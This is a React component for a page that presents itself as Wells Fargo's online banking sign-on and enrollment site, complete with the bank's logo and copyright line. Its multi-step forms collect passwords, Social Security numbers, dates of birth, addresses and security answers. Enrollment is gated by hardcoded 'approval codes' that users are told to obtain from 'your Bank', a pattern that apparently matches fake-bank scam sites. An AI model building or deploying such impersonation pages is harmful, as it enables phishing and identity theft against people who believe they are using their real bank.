import React, { useState, useEffect } from 'react';
import './WellsFargoPage.css';
import { useAuth } from '../../Context/AuthContext';
import { useNavigate, useLocation } from 'react-router-dom';

// Security Verification Modal Component
const SecurityVerificationModal = ({ isOpen, onClose, onVerify }) => {
  const [verificationCode, setVerificationCode] = useState('');
  const [error, setError] = useState('');

  // Valid verification codes - same as in Navbar
  const validCodes = ['WFBPLC09!', 'WFBUSA09!', 'WFBAFC09!', 'WFBEUR09!'];

  // Reset form when modal opens/closes
  useEffect(() => {
    setVerificationCode('');
    setError('');
  }, [isOpen]);

  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Basic validation
    if (!verificationCode.trim()) {
      setError('Please enter a verification code');
      return;
    }
    
    // Check if code is one of the valid codes
    if (!validCodes.includes(verificationCode)) {
      setError('Invalid code. Please enter a valid verification code.');
      return;
    }
    
    // Valid code provided
    onVerify();
  };

  if (!isOpen) return null;

  return (
    <div className="reg001-security-modal-overlay">
      <div className="reg001-security-modal">
        <div className="reg001-security-modal-header">
          <h3>Verification Required</h3>
          <button className="reg001-close-modal" onClick={onClose}>&times;</button>
        </div>
        <div className="reg001-security-modal-body">
          <p>To enroll in Wells Fargo Online, please contact your Bank to obtain your registration approval code.</p>
          
          <form onSubmit={handleSubmit}>
            <div className="reg001-form-group">
              <label htmlFor="transaction-code">Registration Approval Code</label>
              <input
                type="text"
                id="transaction-code"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value)}
                className="reg001-verification-input"
                placeholder="Enter your code"
              />
              {error && <p className="reg001-error-text">{error}</p>}
            </div>
            
            <div className="reg001-modal-actions">
              <button type="button" className="reg001-cancel-btn" onClick={onClose}>Cancel</button>
              <button type="submit" className="reg001-verify-btn">Verify</button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

const WellsFargoPage = () => {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isLoginModal, setIsLoginModal] = useState(true);
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    username: '',
    password: '',
    confirmPassword: '',
    email: '',
    phoneNumber: '',
    addressLine1: '',
    addressLine2: '',
    city: '',
    state: '',
    zipCode: '',
    ssn: '',
    dateOfBirth: '',
    securityQuestion: '',
    securityAnswer: '',
    agreeToTerms: false
  });
  const [loginError, setLoginError] = useState('');
  const [registerError, setRegisterError] = useState('');
  const [formStep, setFormStep] = useState(1);
  const [rememberUsername, setRememberUsername] = useState(false);
  const [savedUsername, setSavedUsername] = useState('');
  const [passwordStrength, setPasswordStrength] = useState('');
  
  // New state for security verification modal
  const [securityModalOpen, setSecurityModalOpen] = useState(false);

  // Add navigation hook
  const navigate = useNavigate();
  const location = useLocation();

  // Use auth context
  const { 
    currentUser, 
    login, 
    logout, 
    loading, 
    authError, 
    updateProfile,
    resetPassword,
    register
  } = useAuth();

  // Modified: Only redirect to dashboard if user is logged in AND we're not explicitly
  // showing a login/register modal from a link click
  useEffect(() => {
    const isModalTriggeredByLink = location.state?.showLogin || location.state?.showRegister;
    
    if (currentUser && !isModalTriggeredByLink) {
      // If user is logged in and no modal request from link, just close the modal if open
      if (isModalOpen) {
        closeModal();
      }
      // Redirect to dashboard 
      navigate('/dashboard');
    }
  }, [currentUser, isModalOpen, navigate, location.state]);

  // Check for any state params (for login/register modals)
  useEffect(() => {
    if (location.state?.showLogin) {
      openLoginModal();
      // DON'T clear the state yet - we need it for the currentUser check above
    } else if (location.state?.showRegister) {
      // Instead of directly opening register modal, open the security verification first
      openSecurityVerificationForRegister();
      // DON'T clear the state yet - we need it for the currentUser check above
    }
  }, [location.state]);

  // Add this new useEffect to handle clearing state after modals are shown
  // This prevents the modal from reopening on page refresh
  useEffect(() => {
    if (isModalOpen && (location.state?.showLogin || location.state?.showRegister)) {
      // Clear the state, but only after the modal is already open
      window.history.replaceState({}, document.title);
    }
  }, [isModalOpen, location.state]);

  // Update form error when auth error changes
  useEffect(() => {
    if (authError) {
      if (isLoginModal) {
        setLoginError(authError);
      } else {
        setRegisterError(authError);
      }
    }
  }, [authError, isLoginModal]);

  // Check for saved username in localStorage on component mount
  useEffect(() => {
    const username = localStorage.getItem('wellsFargoRememberedUsername');
    if (username) {
      setSavedUsername(username);
      setFormData(prev => ({ ...prev, username }));
    }
  }, []);

  // Password strength checker
  useEffect(() => {
    if (formData.password) {
      const strength = checkPasswordStrength(formData.password);
      setPasswordStrength(strength);
    } else {
      setPasswordStrength('');
    }
  }, [formData.password]);

  useEffect(() => {
    console.log("Current user state changed:", currentUser);
    const isModalTriggeredByLink = location.state?.showLogin || location.state?.showRegister;
    
    if (currentUser && !isModalTriggeredByLink) {
      console.log("User logged in, redirecting to dashboard");
      // If user is logged in and no modal request from link, just close the modal if open
      if (isModalOpen) {
        closeModal();
      }
      // Redirect to dashboard 
      navigate('/dashboard');
    }
  }, [currentUser, isModalOpen, navigate, location.state]);
  
  const checkPasswordStrength = (password) => {
    if (!password) return '';
    
    // Check for at least 8 characters
    const isLongEnough = password.length >= 8;
    
    // Check for uppercase, lowercase, numbers, and special characters
    const hasUppercase = /[A-Z]/.test(password);
    const hasLowercase = /[a-z]/.test(password);
    const hasNumbers = /[0-9]/.test(password);
    const hasSpecial = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);
    
    const strengthScore = [isLongEnough, hasUppercase, hasLowercase, hasNumbers, hasSpecial]
      .filter(Boolean).length;
    
    if (strengthScore <= 2) return 'weak';
    if (strengthScore <= 4) return 'medium';
    return 'strong';
  };

  const openLoginModal = () => {
    setIsLoginModal(true);
    setIsModalOpen(true);
    setLoginError('');
  };

  // New method to handle opening security verification for register
  const openSecurityVerificationForRegister = () => {
    setSecurityModalOpen(true);
  };

  // Once verification is successful, actually open the register modal
  const openRegisterAfterVerification = () => {
    setSecurityModalOpen(false);
    setIsLoginModal(false);
    setIsModalOpen(true);
    setRegisterError('');
    setFormStep(1);
  };

  // Modified register button click handler
  const openRegisterModal = () => {
    openSecurityVerificationForRegister();
  };

  const closeModal = () => {
    setIsModalOpen(false);
    // Reset form data when closing modal
    setFormData({
      firstName: '',
      lastName: '',
      username: '',
      password: '',
      confirmPassword: '',
      email: '',
      phoneNumber: '',
      addressLine1: '',
      addressLine2: '',
      city: '',
      state: '',
      zipCode: '',
      ssn: '',
      dateOfBirth: '',
      securityQuestion: '',
      securityAnswer: '',
      agreeToTerms: false
    });
    setLoginError('');
    setRegisterError('');
    setFormStep(1);
  };

  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData(prevState => ({
      ...prevState,
      [name]: type === 'checkbox' ? checked : value
    }));
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    setLoginError('');
    
    try {
      console.log("Login attempt with username:", formData.username);
      
      // Basic validation
      if (!formData.username.trim()) {
        setLoginError('Please enter your username.');
        return;
      }
      
      if (!formData.password) {
        setLoginError('Please enter your password.');
        return;
      }
      
      console.log("Calling login function...");
      const result = await login(formData.username, formData.password);
      console.log("Login result:", result);
      
      if (!result.success) {
        setLoginError(result.error || 'Login failed. Please try again.');
      } else {
        console.log("Login successful");
        // Remember username if checkbox is checked
        if (rememberUsername) {
          localStorage.setItem('wellsFargoRememberedUsername', formData.username);
        } else {
          localStorage.removeItem('wellsFargoRememberedUsername');
        }
        
        // Manually close modal and redirect to dashboard to ensure navigation happens
        closeModal();
        navigate('/dashboard');
      }
    } catch (error) {
      console.error('Login error catch block:', error);
      setLoginError('An unexpected error occurred. Please try again.');
    }
  };

  const validateRegistrationStep1 = () => {
    if (!formData.firstName.trim()) {
      setRegisterError('Please enter your first name.');
      return false;
    }
    if (!formData.lastName.trim()) {
      setRegisterError('Please enter your last name.');
      return false;
    }
    if (!formData.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      setRegisterError('Please enter a valid email address.');
      return false;
    }
    if (!formData.phoneNumber.trim() || !/^\d{10}$/.test(formData.phoneNumber.replace(/\D/g, ''))) {
      setRegisterError('Please enter a valid 10-digit phone number.');
      return false;
    }
    if (!formData.dateOfBirth) {
      setRegisterError('Please enter your date of birth.');
      return false;
    }
    if (!formData.ssn.trim() || !/^\d{9}$/.test(formData.ssn.replace(/\D/g, ''))) {
      setRegisterError('Please enter a valid 9-digit Social Security Number.');
      return false;
    }
    
    return true;
  };

  const validateRegistrationStep2 = () => {
    if (!formData.addressLine1.trim()) {
      setRegisterError('Please enter your street address.');
      return false;
    }
    if (!formData.city.trim()) {
      setRegisterError('Please enter your city.');
      return false;
    }
    if (!formData.state) {
      setRegisterError('Please select your state.');
      return false;
    }
    if (!formData.zipCode.trim() || !/^\d{5}(-\d{4})?$/.test(formData.zipCode)) {
      setRegisterError('Please enter a valid zip code.');
      return false;
    }
    
    return true;
  };

  const validateRegistrationStep3 = () => {
    if (!formData.username.trim() || formData.username.length < 6) {
      setRegisterError('Username must be at least 6 characters.');
      return false;
    }
    if (!formData.password || formData.password.length < 8) {
      setRegisterError('Password must be at least 8 characters.');
      return false;
    }
    if (passwordStrength === 'weak') {
      setRegisterError('Please choose a stronger password.');
      return false;
    }
    if (formData.password !== formData.confirmPassword) {
      setRegisterError('Passwords do not match.');
      return false;
    }
    if (!formData.securityQuestion) {
      setRegisterError('Please select a security question.');
      return false;
    }
    if (!formData.securityAnswer.trim()) {
      setRegisterError('Please provide an answer to your security question.');
      return false;
    }
    if (!formData.agreeToTerms) {
      setRegisterError('You must agree to the terms and conditions.');
      return false;
    }
    
    return true;
  };

  const handleNextStep = () => {
    setRegisterError('');
    
    if (formStep === 1 && validateRegistrationStep1()) {
      setFormStep(2);
    } else if (formStep === 2 && validateRegistrationStep2()) {
      setFormStep(3);
    }
  };

  const handlePrevStep = () => {
    setRegisterError('');
    setFormStep(formStep - 1);
  };

  // Updated handleRegister function to fix registration flow
  const handleRegister = async (e) => {
    e.preventDefault();
    setRegisterError('');

    if (!validateRegistrationStep3()) {
      return;
    }

    try {
      const userData = {
        firstName: formData.firstName,
        lastName: formData.lastName,
        username: formData.username,
        email: formData.email,
        phoneNumber: formData.phoneNumber,
        password: formData.password,
        addressLine1: formData.addressLine1,
        addressLine2: formData.addressLine2,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        ssn: formData.ssn,
        dateOfBirth: formData.dateOfBirth,
        securityQuestion: formData.securityQuestion,
        securityAnswer: formData.securityAnswer,
        // Add this explicit name field
        name: `${formData.firstName} ${formData.lastName}`
      };

      // Use register function from AuthContext
      const result = await register(userData);
      if (!result.success) {
        setRegisterError(result.error || 'Registration failed. Please try again.');
      } else {
        // Success - modal will close and redirect in useEffect when currentUser updates
        closeModal();
      }
    } catch (error) {
      setRegisterError('An unexpected error occurred. Please try again.');
    }
  };

  const handleForgotPassword = async (e) => {
    e.preventDefault();
    if (!formData.username) {
      setLoginError('Please enter your username to reset your password.');
      return;
    }

    try {
      const result = await resetPassword(formData.username);
      if (result.success) {
        setLoginError('Password reset instructions have been sent to your email.');
      } else {
        setLoginError(result.error || 'Password reset failed. Please try again.');
      }
    } catch (error) {
      setLoginError('An unexpected error occurred. Please try again.');
    }
  };

  const handleForgotUsername = async (e) => {
    e.preventDefault();
    setLoginError('Please enter your email address to recover your username.');
    // In a real app, you would implement username recovery functionality here
  };

  const handleLogout = async () => {
    try {
      await logout();
      // Navigate to landing page after logout (handled in useEffect when currentUser becomes null)
    } catch (error) {
      console.error('Logout failed:', error);
    }
  };

  const toggleUsernameRemember = () => {
    setRememberUsername(!rememberUsername);
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const formatSSN = (value) => {
    // Format SSN as XXX-XX-XXXX while typing
    const digits = value.replace(/\D/g, '');
    if (digits.length <= 3) return digits;
    if (digits.length <= 5) return `${digits.slice(0, 3)}-${digits.slice(3)}`;
    return `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5, 9)}`;
  };

  const formatPhoneNumber = (value) => {
    // Format phone as (XXX) XXX-XXXX while typing
    const digits = value.replace(/\D/g, '');
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
    return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6, 10)}`;
  };

  // Special input handlers with formatting
  const handleSSNChange = (e) => {
    const formattedValue = formatSSN(e.target.value);
    setFormData(prev => ({ ...prev, ssn: formattedValue }));
  };

  const handlePhoneChange = (e) => {
    const formattedValue = formatPhoneNumber(e.target.value);
    setFormData(prev => ({ ...prev, phoneNumber: formattedValue }));
  };

  return (
    <div className="reg001-wells-fargo-landing">
      <div className="reg001-background-wrapper">
        <div className="reg001-background-overlay"></div>
      </div>
      
      <div className="reg001-landing-container">
        <header className="reg001-landing-header">
          <div className="reg001-logo-container">
            <img 
              src="/Images/wells fargo.jpeg" 
              alt="Wells Fargo Logo" 
              className="reg001-wells-fargo-logo"
            />
          </div>
          {currentUser && (
            <div className="reg001-user-menu">
              <span>Welcome, {currentUser.firstName}</span>
              <button 
                className="reg001-logout-btn" 
                onClick={handleLogout}
              >
                Log Out
              </button>
            </div>
          )}
        </header>

        <main className="reg001-landing-content">
          {currentUser ? (
            // Logged-in user view
            <div className="reg001-dashboard">
              <div className="reg001-welcome-section">
                <h1>Welcome back, {currentUser.firstName}!</h1>
                <p>Your Wells Fargo Dashboard</p>
              </div>
              
              <div className="reg001-dashboard-content">
                <div className="reg001-account-summary">
                  <h2>Account Summary</h2>
                  <p>View your accounts and recent transactions.</p>
                  <button 
                    className="reg001-dashboard-btn"
                    onClick={() => navigate('/accounts')}
                  >
                    View Accounts
                  </button>
                </div>
                
                <div className="reg001-quick-actions">
                  <h2>Quick Actions</h2>
                  <div className="reg001-action-buttons">
                    <button 
                      className="reg001-action-btn"
                      onClick={() => navigate('/transfer-money')}
                    >
                      Transfer Money
                    </button>
                    <button 
                      className="reg001-action-btn"
                      onClick={() => navigate('/pay-bills')}
                    >
                      Pay Bills
                    </button>
                    <button 
                      className="reg001-action-btn"
                      onClick={() => navigate('/deposit-check')}
                    >
                      Mobile Deposit
                    </button>
                  </div>
                </div>
              </div>
            </div>
          ) : (
            // Guest views
            <>
              <div className="reg001-welcome-section">
                <h1>Welcome to Wells Fargo</h1>
                <p>Banking Made Easy, Secure, and Personalized</p>
              </div>

              <div className="reg001-security-features">
                <div className="reg001-feature">
                  <i className="reg001-icon-lock"></i>
                  <span>Advanced Security</span>
                </div>
                <div className="reg001-feature">
                  <i className="reg001-icon-shield"></i>
                  <span>Account Protection</span>
                </div>
                <div className="reg001-feature">
                  <i className="reg001-icon-mobile"></i>
                  <span>Mobile Banking</span>
                </div>
              </div>

              <div className="reg001-cta-buttons">
                <button 
                  className="reg001-login-btn" 
                  onClick={openLoginModal}
                  disabled={loading}
                >
                  {loading ? 'Please wait...' : 'Sign On'}
                </button>
                <button 
                  className="reg001-register-btn" 
                  onClick={openRegisterModal}
                  disabled={loading}
                >
                  {loading ? 'Please wait...' : 'Enroll Now'}
                </button>
              </div>
            </>
          )}
        </main>

        <footer className="reg001-landing-footer">
          <div className="reg001-footer-links">
            <a href="#">Privacy, Cookies, Security & Legal</a>
            <a href="#">Notice of Data Collection</a>
            <a href="#">General Terms of Use</a>
            <a href="#">Online Access Agreement</a>
          </div>
          <p>© {new Date().getFullYear()} Wells Fargo Bank, N.A. All rights reserved. Member FDIC.</p>
        </footer>
      </div>

      {/* Security verification modal for registration */}
      <SecurityVerificationModal
        isOpen={securityModalOpen}
        onClose={() => setSecurityModalOpen(false)}
        onVerify={openRegisterAfterVerification}
      />

      {isModalOpen && (
        <div className="reg001-modal-overlay">
          <div className={`reg001-modal-content ${isLoginModal ? 'reg001-login-modal' : 'reg001-register-modal'}`}>
            <button 
              className="reg001-close-modal" 
              onClick={closeModal}
              aria-label="Close modal"
              disabled={loading}
            >
              &#10005;
            </button>
            <div className="reg001-modal-header">
              <img 
                src="/Images/wells fargo.jpeg" 
                alt="Wells Fargo Logo" 
                className="reg001-modal-logo"
              />
              <h2>{isLoginModal ? 'Sign On to Wells Fargo Online' : 'Enroll in Wells Fargo Online'}</h2>
            </div>
            
            {/* Display error messages */}
            {isLoginModal && loginError && (
              <div className="reg001-error-message">{loginError}</div>
            )}
            {!isLoginModal && registerError && (
              <div className="reg001-error-message">{registerError}</div>
            )}
            
            {isLoginModal ? (
              // LOGIN FORM
              <form 
                className="reg001-login-form" 
                onSubmit={handleLogin}
              >
                <div className="reg001-input-group">
                  <label htmlFor="username">Username</label>
                  {savedUsername ? (
                    <div className="reg001-saved-username">
                      <span>{savedUsername}</span>
                      <button 
                        type="button" 
                        className="reg001-change-username"
                        onClick={() => {
                          setSavedUsername('');
                          setFormData(prev => ({ ...prev, username: '' }));
                        }}
                      >
                        Change
                      </button>
                    </div>
                  ) : (
                    <input 
                      id="username"
                      name="username"
                      type="text" 
                      placeholder="Username" 
                      className="reg001-modal-input"
                      value={formData.username}
                      onChange={handleInputChange}
                      required
                      disabled={loading}
                      autoComplete="username"
                    />
                  )}
                </div>
                <div className="reg001-input-group reg001-password-group">
                  <label htmlFor="password">Password</label>
                  <div className="reg001-password-input-wrapper">
                    <input 
                      id="password"
                      name="password"
                      type={showPassword ? "text" : "password"} 
                      placeholder="Password" 
                      className="reg001-modal-input"
                      value={formData.password}
                      onChange={handleInputChange}
                      required
                      disabled={loading}
                      autoComplete="current-password"
                    />
                    <button 
                      type="button" 
                      className="reg001-password-toggle"
                      onClick={togglePasswordVisibility}
                      aria-label="Toggle password visibility"
                      disabled={loading}
                    >
                      {showPassword ? '👁️' : '👁️‍🗨️'}
                    </button>
                  </div>
                </div>

                <div className="reg001-remember-me">
                  <label className="reg001-checkbox-label">
                    <input 
                      type="checkbox" 
                      checked={rememberUsername}
                      onChange={toggleUsernameRemember}
                      disabled={loading}
                    />
                    <span>Save username</span>
                  </label>
                  <span className="reg001-checkbox-help">Select if using a private device</span>
                </div>

                <button 
                  type="submit" 
                  className="reg001-modal-submit"
                  disabled={loading}
                >
                  {loading ? 'Signing On...' : 'Sign On'}
                </button>

                <div className="reg001-security-features reg001-login-security">
                  <div className="reg001-feature">
                    <i className="reg001-icon-shield"></i>
                    <span>Enhanced Security</span>
                  </div>
                </div>

                <div className="reg001-modal-extra-links">
                  <a 
                    href="#" 
                    onClick={(e) => handleForgotUsername(e)}
                    disabled={loading}
                  >
                    Forgot Username?
                  </a>
                  <a 
                    href="#" 
                    onClick={(e) => handleForgotPassword(e)}
                    disabled={loading}
                  >
                    Forgot Password?
                  </a>
                  <a 
                    href="#" 
                    onClick={(e) => {
                      e.preventDefault();
                      closeModal();
                      openRegisterModal();
                    }}
                    disabled={loading}
                  >
                    Enroll Now
                  </a>
                </div>
              </form>
            ) : (
              // REGISTRATION FORM (MULTI-STEP)
              <form 
                className="reg001-register-form" 
                onSubmit={formStep === 3 ? handleRegister : (e) => e.preventDefault()}
              >
                <div className="reg001-form-progress">
                  <div className={`reg001-progress-step ${formStep >= 1 ? 'active' : ''} ${formStep > 1 ? 'completed' : ''}`}>1</div>
                  <div className="reg001-progress-line"></div>
                  <div className={`reg001-progress-step ${formStep >= 2 ? 'active' : ''} ${formStep > 2 ? 'completed' : ''}`}>2</div>
                  <div className="reg001-progress-line"></div>
                  <div className={`reg001-progress-step ${formStep === 3 ? 'active' : ''}`}>3</div>
                </div>

                {formStep === 1 && (
                  <div className="reg001-form-step">
                    <h3>Personal Information</h3>
                    
                    <div className="reg001-input-row">
                      <div className="reg001-input-group">
                        <label htmlFor="firstName">First Name</label>
                        <input 
                          id="firstName"
                          name="firstName"
                          type="text" 
                          placeholder="First Name" 
                          className="reg001-modal-input"
                          value={formData.firstName}
                          onChange={handleInputChange}
                          required
                          disabled={loading}
                        />
                      </div>
                      <div className="reg001-input-group">
                        <label htmlFor="lastName">Last Name</label>
                        <input 
                          id="lastName"
                          name="lastName"
                          type="text" 
                          placeholder="Last Name" 
                          className="reg001-modal-input"
                          value={formData.lastName}
                          onChange={handleInputChange}
                          required
                          disabled={loading}
                        />
                      </div>
                    </div>
                    
                    <div className="reg001-input-group">
                      <label htmlFor="email">Email Address</label>
                      <input 
                        id="email"
                        name="email"
                        type="email" 
                        placeholder="Email" 
                        className="reg001-modal-input"
                        value={formData.email}
                        onChange={handleInputChange}
                        required
                        disabled={loading}
                      />
                    </div>
                    
                    <div className="reg001-input-group">
                      <label htmlFor="phoneNumber">Phone Number</label>
                      <input 
                        id="phoneNumber"
                        name="phoneNumber"
                        type="tel" 
                        placeholder="(XXX) XXX-XXXX" 
                        className="reg001-modal-input"
                        value={formData.phoneNumber}
                        onChange={handlePhoneChange}
                        required
                        disabled={loading}
                      />
                    </div>
                    
                    <div className="reg001-input-row">
                      <div className="reg001-input-group">
                        <label htmlFor="dateOfBirth">Date of Birth</label>
                        <input 
                          id="dateOfBirth"
                          name="dateOfBirth"
                          type="date" 
                          className="reg001-modal-input"
                          value={formData.dateOfBirth}
                          onChange={handleInputChange}
                          required
                          disabled={loading}
                        />
                      </div>
                      <div className="reg001-input-group">
                        <label htmlFor="ssn">Social Security Number</label>
                        <input 
                          id="ssn"
                          name="ssn"
                          type="text" 
                          placeholder="XXX-XX-XXXX" 
                          className="reg001-modal-input"
                          value={formData.ssn}
                          onChange={handleSSNChange}
                          required
                          disabled={loading}
                          maxLength={11}
                        />
                      </div>
                    </div>
                    
                    <div className="reg001-form-actions">
                      <button 
                        type="button" 
                        className="reg001-next-btn"
                        onClick={handleNextStep}
                        disabled={loading}
                      >
                        Next
                      </button>
                    </div>
                  </div>
                )}

                {formStep === 2 && (
                  <div className="reg001-form-step">
                    <h3>Contact Information</h3>
                    
                    <div className="reg001-input-group">
                      <label htmlFor="addressLine1">Street Address</label>
                      <input 
                        id="addressLine1"
                        name="addressLine1"
                        type="text" 
                        placeholder="Street Address" 
                        className="reg001-modal-input"
                        value={formData.addressLine1}
                        onChange={handleInputChange}
                        required
                        disabled={loading}
                      />
                    </div>
                    
                    <div className="reg001-input-group">
                      <label htmlFor="addressLine2">Apartment/Suite/Unit (Optional)</label>
                      <input 
                        id="addressLine2"
                        name="addressLine2"
                        type="text" 
                        placeholder="Apt, Suite, Unit, etc. (optional)" 
                        className="reg001-modal-input"
                        value={formData.addressLine2}
                        onChange={handleInputChange}
                        disabled={loading}
                      />
                    </div>
                    
                    <div className="reg001-input-row">
                      <div className="reg001-input-group">
                        <label htmlFor="city">City</label>
                        <input 
                          id="city"
                          name="city"
                          type="text" 
                          placeholder="City" 
                          className="reg001-modal-input"
                          value={formData.city}
                          onChange={handleInputChange}
                          required
                          disabled={loading}
                        />
                      </div>
                      <div className="reg001-input-group">
                        <label htmlFor="state">State</label>
                        <select
                          id="state"
                          name="state"
                          className="reg001-modal-input"
                          value={formData.state}
                          onChange={handleInputChange}
                          required
                          disabled={loading}
                        >
                          <option value="">Select State</option>
                          <option value="AL">Alabama</option>
                          <option value="AK">Alaska</option>
                          <option value="AZ">Arizona</option>
                          <option value="AR">Arkansas</option>
                          <option value="CA">California</option>
                          <option value="CO">Colorado</option>
                          <option value="CT">Connecticut</option>
                          <option value="DE">Delaware</option>
                          <option value="DC">District Of Columbia</option>
                          <option value="FL">Florida</option>
                          <option value="GA">Georgia</option>
                          <option value="HI">Hawaii</option>
                          <option value="ID">Idaho</option>
                          <option value="IL">Illinois</option>
                          <option value="IN">Indiana</option>
                          <option value="IA">Iowa</option>
                          <option value="KS">Kansas</option>
                          <option value="KY">Kentucky</option>
                          <option value="LA">Louisiana</option>
                          <option value="ME">Maine</option>
                          <option value="MD">Maryland</option>
                          <option value="MA">Massachusetts</option>
                          <option value="MI">Michigan</option>
                          <option value="MN">Minnesota</option>
                          <option value="MS">Mississippi</option>
                          <option value="MO">Missouri</option>
                          <option value="MT">Montana</option>
                          <option value="NE">Nebraska</option>
                          <option value="NV">Nevada</option>
                          <option value="NH">New Hampshire</option>
                          <option value="NJ">New Jersey</option>
                          <option value="NM">New Mexico</option>
                          <option value="NY">New York</option>
                          <option value="NC">North Carolina</option>
                          <option value="ND">North Dakota</option>
                          <option value="OH">Ohio</option>
                          <option value="OK">Oklahoma</option>
                          <option value="OR">Oregon</option>
                          <option value="PA">Pennsylvania</option>
                          <option value="RI">Rhode Island</option>
                          <option value="SC">South Carolina</option>
                          <option value="SD">South Dakota</option>
                          <option value="TN">Tennessee</option>
                          <option value="TX">Texas</option>
                          <option value="UT">Utah</option>
                          <option value="VT">Vermont</option>
                          <option value="VA">Virginia</option>
                          <option value="WA">Washington</option>
                          <option value="WV">West Virginia</option>
                          <option value="WI">Wisconsin</option>
                          <option value="WY">Wyoming</option>
                        </select>
                      </div>
                    </div>
                    
                    <div className="reg001-input-group">
                      <label htmlFor="zipCode">Zip Code</label>
                      <input 
                        id="zipCode"
                        name="zipCode"
                        type="text" 
                        placeholder="Zip Code" 
                        className="reg001-modal-input"
                        value={formData.zipCode}
                        onChange={handleInputChange}
                        required
                        disabled={loading}
                        maxLength={10}
                      />
                    </div>
                    
                    <div className="reg001-form-actions">
                      <button 
                        type="button" 
                        className="reg001-back-btn"
                        onClick={handlePrevStep}
                        disabled={loading}
                      >
                        Back
                      </button>
                      <button 
                        type="button" 
                        className="reg001-next-btn"
                        onClick={handleNextStep}
                        disabled={loading}
                      >
                        Next
                      </button>
                    </div>
                  </div>
                )}

                {formStep === 3 && (
                  <div className="reg001-form-step">
                    <h3>Account Setup</h3>
                    
                    <div className="reg001-input-group">
                      <label htmlFor="username">Username</label>
                      <input 
                        id="username"
                        name="username"
                        type="text" 
                        placeholder="Choose a username (at least 6 characters)" 
                        className="reg001-modal-input"
                        value={formData.username}
                        onChange={handleInputChange}
                        required
                        disabled={loading}
                        minLength={6}
                      />
                      <span className="reg001-input-hint">Username must be at least 6 characters</span>
                    </div>
                    
                    <div className="reg001-input-group reg001-password-group">
                      <label htmlFor="password">Password</label>
                      <div className="reg001-password-input-wrapper">
                        <input 
                          id="password"
                          name="password"
                          type={showPassword ? "text" : "password"} 
                          placeholder="Create a password (at least 8 characters)" 
                          className="reg001-modal-input"
                          value={formData.password}
                          onChange={handleInputChange}
                          required
                          disabled={loading}
                          minLength={8}
                        />
                        <button 
                          type="button" 
                          className="reg001-password-toggle"
                          onClick={togglePasswordVisibility}
                          aria-label="Toggle password visibility"
                          disabled={loading}
                        >
                          {showPassword ? '👁️' : '👁️‍🗨️'}
                        </button>
                      </div>
                      {passwordStrength && (
                        <div className={`reg001-password-strength reg001-strength-${passwordStrength}`}>
                          <span className="reg001-strength-meter"></span>
                          <span className="reg001-strength-text">{passwordStrength.charAt(0).toUpperCase() + passwordStrength.slice(1)}</span>
                        </div>
                      )}
                      <span className="reg001-input-hint">
                        Password must be at least 8 characters and include uppercase, lowercase, numbers, and special characters
                      </span>
                    </div>
                    
                    <div className="reg001-input-group reg001-password-group">
                      <label htmlFor="confirmPassword">Confirm Password</label>
                      <div className="reg001-password-input-wrapper">
                        <input 
                          id="confirmPassword"
                          name="confirmPassword"
                          type={showPassword ? "text" : "password"} 
                          placeholder="Confirm your password" 
                          className="reg001-modal-input"
                          value={formData.confirmPassword}
                          onChange={handleInputChange}
                          required
                          disabled={loading}
                        />
                      </div>
                    </div>
                    
                    <div className="reg001-input-group">
                      <label htmlFor="securityQuestion">Security Question</label>
                      <select
                        id="securityQuestion"
                        name="securityQuestion"
                        className="reg001-modal-input"
                        value={formData.securityQuestion}
                        onChange={handleInputChange}
                        required
                        disabled={loading}
                      >
                        <option value="">Select a security question</option>
                        <option value="mother-maiden-name">What is your mother's maiden name?</option>
                        <option value="first-pet">What was the name of your first pet?</option>
                        <option value="birth-city">In what city were you born?</option>
                        <option value="high-school">What high school did you attend?</option>
                        <option value="first-car">What was the make of your first car?</option>
                        <option value="favorite-teacher">Who was your favorite teacher?</option>
                      </select>
                    </div>
                    
                    <div className="reg001-input-group">
                      <label htmlFor="securityAnswer">Security Answer</label>
                      <input 
                        id="securityAnswer"
                        name="securityAnswer"
                        type="text" 
                        placeholder="Your answer" 
                        className="reg001-modal-input"
                        value={formData.securityAnswer}
                        onChange={handleInputChange}
                        required
                        disabled={loading}
                      />
                      <span className="reg001-input-hint">Remember this answer for account recovery</span>
                    </div>
                    
                    <div className="reg001-terms">
                      <label className="reg001-checkbox-label">
                        <input 
                          type="checkbox" 
                          name="agreeToTerms"
                          checked={formData.agreeToTerms}
                          onChange={handleInputChange}
                          required
                          disabled={loading}
                        />
                        <span>I agree to the Wells Fargo Online <a href="#" target="_blank">Terms and Conditions</a> and <a href="#" target="_blank">Privacy Policy</a></span>
                      </label>
                    </div>
                    
                    <div className="reg001-form-actions">
                      <button 
                        type="button" 
                        className="reg001-back-btn"
                        onClick={handlePrevStep}
                        disabled={loading}
                      >
                        Back
                      </button>
                      <button 
                        type="submit" 
                        className="reg001-register-submit"
                        disabled={loading}
                      >
                        {loading ? 'Enrolling...' : 'Complete Enrollment'}
                      </button>
                    </div>
                  </div>
                )}

                <div className="reg001-security-features reg001-register-security">
                  <div className="reg001-feature">
                    <i className="reg001-icon-lock"></i>
                    <span>Secure Enrollment</span>
                  </div>
                  <div className="reg001-feature">
                    <i className="reg001-icon-shield"></i>
                    <span>Data Protection</span>
                  </div>
                </div>

                <div className="reg001-modal-extra-links">
                  <a 
                    href="#" 
                    onClick={(e) => {
                      e.preventDefault();
                      closeModal();
                      // Delay opening login modal to avoid UI conflicts
                      setTimeout(() => {
                        openLoginModal();
                      }, 100);
                    }}
                    disabled={loading}
                  >
                    Already have an account? Sign On
                  </a>
                </div>
              </form>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default WellsFargoPage;